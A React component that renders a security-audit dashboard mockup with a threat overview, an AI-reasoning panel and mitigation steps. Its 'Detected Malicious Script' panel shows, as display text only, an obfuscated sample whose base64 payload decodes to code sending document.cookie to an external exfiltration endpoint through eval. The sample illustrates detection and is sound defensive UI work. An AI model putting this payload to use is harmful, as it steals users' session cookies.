import React from 'react';

export default function AdminAuditAnalysis() {
  return (
    <main className="flex-1 overflow-y-auto relative bg-transparent">
      {/* Background Radial Gradient */}
      <div className="absolute top-0 right-0 size-[600px] bg-primary/10 blur-[120px] rounded-full -mr-48 -mt-48 pointer-events-none"></div>
      
      <header className="sticky top-0 z-10 px-8 py-4 glass-panel border-b border-white/10">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex flex-col">
            <div className="flex items-center gap-2 mb-1">
              <a className="text-primary text-sm font-medium flex items-center hover:underline cursor-pointer">
                <span className="material-symbols-outlined text-sm mr-1">arrow_back</span>
                Back to History
              </a>
            </div>
            <h1 className="text-2xl font-bold tracking-tight text-white">
              Audit Analysis: <span className="text-slate-500 font-medium">Breach_Audit_Q3_2024</span>
            </h1>
          </div>
          <div className="flex items-center gap-3">
            <button className="px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl text-sm font-semibold flex items-center gap-2 text-white transition-colors active:scale-95">
              <span className="material-symbols-outlined text-[20px]">share</span> Share
            </button>
            <button className="px-4 py-2 bg-primary hover:bg-primary-hover text-white rounded-xl text-sm font-semibold flex items-center gap-2 shadow-glow-primary transition-all active:scale-95">
              <span className="material-symbols-outlined text-[20px]">picture_as_pdf</span> Export PDF
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-6xl mx-auto px-8 py-8 space-y-6 relative z-10">
        {/* Threat Overview Card */}
        <section className="glass-card rounded-2xl overflow-hidden shadow-glass relative">
          <div className="absolute top-0 left-0 w-1.5 h-full bg-danger"></div>
          <div className="p-8">
            <div className="flex flex-col md:flex-row md:items-start justify-between gap-6">
              <div className="space-y-4 max-w-2xl">
                <div className="flex items-center gap-3">
                  <span className="px-3 py-1 bg-danger text-white text-xs font-black rounded-full uppercase tracking-wider shadow-glow-danger">DANGER</span>
                  <span className="text-slate-400 text-sm font-medium flex items-center gap-1">
                    <span className="material-symbols-outlined text-sm">schedule</span>
                    Detected 14m ago
                  </span>
                </div>
                <div>
                  <h2 className="text-3xl font-extrabold tracking-tight mb-2 text-white">Threat Overview: Polymorphic Attack</h2>
                  <p className="text-slate-400 leading-relaxed text-lg">
                    Unauthorized lateral movement patterns mimicking system administrative traffic. 
                    The attack utilizes obfuscated payloads to bypass traditional signature-based detection.
                  </p>
                </div>
              </div>
              <div className="flex flex-col items-center justify-center p-6 bg-white/5 rounded-2xl border border-white/10 min-w-[200px]">
                <div className="relative size-32">
                  <svg className="size-full transform -rotate-90">
                    <circle className="text-slate-800" cx="64" cy="64" fill="transparent" r="58" stroke="currentColor" strokeWidth="8"></circle>
                    <circle className="text-danger drop-shadow-[0_0_8px_rgba(244,63,94,0.5)]" cx="64" cy="64" fill="transparent" r="58" stroke="currentColor" strokeDasharray="364.4" strokeDashoffset="54.66" strokeWidth="8" strokeLinecap="round"></circle>
                  </svg>
                  <div className="absolute inset-0 flex flex-col items-center justify-center">
                    <span className="text-3xl font-black text-white">85%</span>
                    <span className="text-[10px] font-bold text-slate-500 uppercase tracking-tighter w-full text-center">Risk Score</span>
                  </div>
                </div>
                <p className="mt-4 text-xs font-bold text-danger uppercase tracking-wider">Critical Priority</p>
              </div>
            </div>
          </div>
        </section>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Suspicious Content Section */}
          <div className="lg:col-span-2 space-y-6">
            <section className="glass-card rounded-2xl overflow-hidden flex flex-col h-full shadow-glass">
              <div className="px-6 py-4 border-b border-white/10 flex items-center justify-between bg-white/5">
                <h3 className="font-bold flex items-center gap-2 text-white">
                  <span className="material-symbols-outlined text-danger">code</span>
                  Detected Malicious Script
                </h3>
                <div className="flex gap-1.5">
                  <div className="size-3 rounded-full bg-slate-700"></div>
                  <div className="size-3 rounded-full bg-slate-700"></div>
                  <div className="size-3 rounded-full bg-slate-700"></div>
                </div>
              </div>
              <div className="p-6 font-mono text-sm overflow-x-auto bg-[#050505] text-slate-300 h-full">
                <pre><code><span className="text-purple-400">const</span> _0x4f2a = [<span className="text-success">'eval'</span>, <span className="text-success">'Buffer'</span>, <span className="text-success">'from'</span>];{'\n'}
<span className="text-slate-500">// Obfuscated Telemetry Bypass Payload</span>{'\n'}
(<span className="text-primary">function</span>(obj, key) {'{\n'}
    <span className="text-primary">const</span> decoder = <span className="text-primary">function</span>(s) {'{\n'}
        <span className="text-primary">return</span> window[<span className="text-success">'atob'</span>](s);{'\n'}
    {`}`};{'\n'}
    <span className="text-primary">const</span> payload = <span className="text-success">'dmFyIHg9bmV3IFhNTUh0dHBSZXF1ZXN0KCk7eC5vcGVuKCdQT1NUJywiaHR0cHM6Ly9hdXRoLXNlbnRpbmVsLmlvL2V4ZmlsdHJhdGUiKTt4LnNlbmQoZG9jdW1lbnQuY29va2llKTs='</span>;{'\n'}
    <span className="text-primary">globalThis</span>[_0x4f2a[<span className="text-warning">0</span>]](decoder(payload));{'\n'}
{`}`})(window, _0x4f2a);</code></pre>
              </div>
            </section>
          </div>

          {/* AI Reasoning Breakdown */}
          <div className="space-y-6">
            <section className="glass-card rounded-2xl p-6 shadow-glass h-full border-t-4 border-primary">
              <h3 className="text-lg font-bold mb-6 flex items-center gap-2 text-white">
                <span className="material-symbols-outlined text-primary">psychology</span>
                AI Reasoning Breakdown
              </h3>
              <div className="space-y-4">
                <div className="p-4 rounded-xl bg-white/5 border border-white/10 group hover:border-primary/50 transition-all cursor-default">
                  <div className="flex items-center gap-3 mb-2">
                    <span className="material-symbols-outlined text-danger bg-danger/10 p-1.5 rounded-lg">upload</span>
                    <h4 className="font-bold text-sm text-white">Credential Exfiltration</h4>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed">System identified attempts to read <code>document.cookie</code> and transmit via POST to an external domain.</p>
                </div>
                
                <div className="p-4 rounded-xl bg-white/5 border border-white/10 group hover:border-primary/50 transition-all cursor-default">
                  <div className="flex items-center gap-3 mb-2">
                    <span className="material-symbols-outlined text-warning bg-warning/10 p-1.5 rounded-lg">key_visualizer</span>
                    <h4 className="font-bold text-sm text-white">Side-Channel Attack</h4>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed">Timing analysis suggests a correlation between UI interactions and encrypted outbound data spikes.</p>
                </div>
                
                <div className="p-4 rounded-xl bg-white/5 border border-white/10 group hover:border-primary/50 transition-all cursor-default">
                  <div className="flex items-center gap-3 mb-2">
                    <span className="material-symbols-outlined text-info bg-info/10 p-1.5 rounded-lg">visibility_off</span>
                    <h4 className="font-bold text-sm text-white">Obfuscated Telemetry</h4>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed">Payload used Base64 double-encoding and proxy-level obfuscation to hide its destination.</p>
                </div>
              </div>
            </section>
          </div>
        </div>

        {/* Mitigation Steps */}
        <section className="glass-card rounded-2xl p-8 shadow-glass border-b-4 border-danger">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
            <div>
              <h3 className="text-xl font-bold text-white">Urgent Mitigation Steps</h3>
              <p className="text-slate-400 text-sm">Follow these procedures to isolate and neutralize the threat.</p>
            </div>
            <div className="px-4 py-2 bg-danger/10 text-danger rounded-full text-xs font-bold uppercase tracking-widest shadow-glow-danger">
              Recommended Actions
            </div>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-white/10 bg-white/5 shadow-sm hover:bg-white/10 transition-colors cursor-pointer group">
              <div className="size-6 mt-0.5 rounded-full border-2 border-danger flex items-center justify-center flex-shrink-0 group-hover:bg-danger/20 transition-colors">
                <div className="size-3 bg-danger rounded-full"></div>
              </div>
              <div>
                <h4 className="font-bold text-sm mb-1 text-white">Revoke Session Keys</h4>
                <p className="text-xs text-slate-400">Invalidate all current active sessions for the affected user group.</p>
              </div>
            </div>
            
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-white/10 bg-white/5 shadow-sm hover:bg-white/10 transition-colors cursor-pointer group">
              <div className="size-6 mt-0.5 rounded-full border-2 border-danger flex items-center justify-center flex-shrink-0 group-hover:bg-danger/20 transition-colors">
                <div className="size-3 bg-danger rounded-full"></div>
              </div>
              <div>
                <h4 className="font-bold text-sm mb-1 text-white">Enforce MFA Rotation</h4>
                <p className="text-xs text-slate-400">Force immediate multi-factor re-authentication for admin accounts.</p>
              </div>
            </div>
            
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-white/10 bg-white/5 shadow-sm hover:bg-white/10 transition-colors cursor-pointer group">
              <div className="size-6 mt-0.5 rounded-full border-2 border-danger flex items-center justify-center flex-shrink-0 group-hover:bg-danger/20 transition-colors">
                <div className="size-3 bg-danger rounded-full"></div>
              </div>
              <div>
                <h4 className="font-bold text-sm mb-1 text-white">Update WAF Rules</h4>
                <p className="text-xs text-slate-400">Push the newly generated signature to the edge firewall clusters.</p>
              </div>
            </div>
          </div>
          
          <div className="mt-8 pt-8 border-t border-white/10 flex justify-end">
            <button className="px-8 py-3 bg-danger hover:bg-danger/90 text-white rounded-xl font-bold shadow-glow-danger transition-transform active:scale-95">
              Authorize Immediate Response
            </button>
          </div>
        </section>

      </div>
      <div className="h-20"></div>
    </main>
  );
}
